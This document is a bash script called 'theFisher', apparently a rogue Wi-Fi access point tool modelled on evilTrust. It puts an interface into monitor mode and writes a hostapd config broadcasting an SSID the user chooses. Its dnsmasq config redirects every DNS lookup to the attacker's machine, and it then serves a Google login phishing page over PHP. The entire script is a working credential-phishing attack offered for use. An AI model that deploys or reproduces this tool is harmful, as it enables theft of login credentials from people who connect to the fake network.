#!/bin/bash

#Name: theFisher
#Author: Blust
#Inspired in s4vitar tool: https://github.com/s4vitar/evilTrust

#Redirecting Ctrl_c

function ctrl_c(){
  echo -e "\n\n[+] Exiting... [+]"
  sleep 1.5; ifconfig wlan0mon down 2>/dev/null; sleep 0.5
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 0.5
	ifconfig wlan0mon up 2>/dev/null
  airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
  NetworkManager; sleep 1
  service networking restart; sleep 0.5
  NetworkManager; sleep 0.3
  exit 1
}

trap ctrl_c INT

#Iface panel to select interfaces

function interfacePanel(){
  echo -e "\n[+] Interfaces availables: "; sleep 1
  interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > ./files/iface.txt)
  c=0;while read interface; do 
    echo -e "\n\t[$c]: $interface";sleep 0.10
    ((c++))
  done < ./files/iface.txt

  #Iterate the array searching for the right iface
	check=0; while [ $check -ne 1 ]; do
  echo -ne "\n[+] Select interface (number): " && read ifaceNumber
    arrayIface=($(cat ./files/iface.txt))
    i=0;while [ $i -le $(echo ${#arrayIface[@]}) ]; do
			if [[ $ifaceNumber == $i ]]; then
        check=1
        selectedIface=${arrayIface[$i]}
        echo $selectedIface
			fi
      ((i++))
		done; if [[ $check -eq 0 ]]; then echo -e "\n[] Interface doesn't exists []"; fi
	done

  airmon-ng start $selectedIface > /dev/null 2>&1
  monitorIface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > ./files/monitorIface.txt)
  echo -e "\n[+] Interfaces in monitor mode availables: "; sleep 1
  d=0;while read monitorIface; do 
    echo -e "\n\t[$d]: $monitorIface";sleep 0.10
    ((d++))
  done < ./files/monitorIface.txt
  
  #Iterate the array searching for the right monitor iface
  check1=0; while [ $check1 -ne 1 ]; do
    echo -ne "\n[+] Select interface in monitor mode (number): " && read monitorIfaceNumber
    arrayMonitorIface=($(cat ./files/monitorIface.txt))
    j=0;while [ $j -le $(echo ${#arrayMonitorIface[@]}) ]; do
      if [[ $monitorIfaceNumber == $j ]]; then
        check1=1
        selectedMonitorIface=${arrayMonitorIface[$j]}
        echo $selectedMonitorIface
      fi
      ((j++))
    done; if [[ $check1 -eq 0 ]]; then echo -e "\n[] Interface doesn't exists []"; fi
  done

  #Getting the name and the channel of the AP from the user's input
  echo -ne "[+] Type the access point's name: " && read ssidName
  while :; do
    read -p "[+] Select the channel to use between 1 and 12: " channel
    [[ $channel =~ ^[0-9]+$ ]] || { echo "Enter a number between 1 and 12"; continue; }
    if (($channel >= 1 && $channel <= 12)); then
      break
    else
      echo "Please enter a number between 1 and 12"
    fi
  done
}

function attackConfig(){
  #Killing process that can cause interferences on the deployment
  killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
  #Preparing hostapd config
  echo -e "[+] Preparing hostapd config [+]\n"
  sleep 3
  echo "interface=$selectedMonitorIface" > ./files/hostapd.conf
  echo "driver=nl80211" >> ./files/hostapd.conf
  echo "ssid=$ssidName" >> ./files/hostapd.conf
  echo "hw_mode=g" >> ./files/hostapd.conf
  echo "channel=$channel" >> ./files/hostapd.conf
  echo "macaddr_acl=0" >> ./files/hostapd.conf
  echo "auth_algs=1" >> ./files/hostapd.conf
  echo "ignore_broadcast_ssid=0" >> ./files/hostapd.conf
  hostapd ./files/hostapd.conf > /dev/null 2>&1 &
  sleep 5
  
  #Preparing dnsmasq config
  echo -e "[+] Preparing dnsmasq config [+]\n"
  echo "interface=$selectedMonitorIface" > ./files/dnsmasq.conf
  echo "dhcp-range=192.168.1.2,192.168.1.62,255.255.255.0,12h" >> ./files/dnsmasq.conf
  echo "dhcp-option=3,192.168.1.1" >> ./files/dnsmasq.conf
  echo "dhcp-option=6,192.168.1.1" >> ./files/dnsmasq.conf
  echo "server=8.8.8.8" >> ./files/dnsmasq.conf
  echo "log-queries" >> ./files/dnsmasq.conf
  echo "log-dhcp" >> ./files/dnsmasq.conf
  echo "listen-address=127.0.0.1" >> ./files/dnsmasq.conf
  echo "address=/#/192.168.1.1" >> ./files/dnsmasq.conf

  ifconfig $selectedMonitorIface up 192.168.1.1 netmask 255.255.255.0
  sleep 0.7
  route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
  sleep 0.7
  dnsmasq -C ./files/dnsmasq.conf -d > /dev/null 2>&1 &
  sleep 7
}

function googleTemplate(){
  cd ./templates/google/
  php -S 192.168.1.1:80 > /dev/null 2>&1 &
  sleep 3600
}

function servingTemplates(){
  googleTemplate
}

#Main

if [[ $(whoami) == 'root' ]]; then
  interfacePanel
  attackConfig
  servingTemplates
else
  echo -e "[+] You need to be root to run the tool [+]"
fi
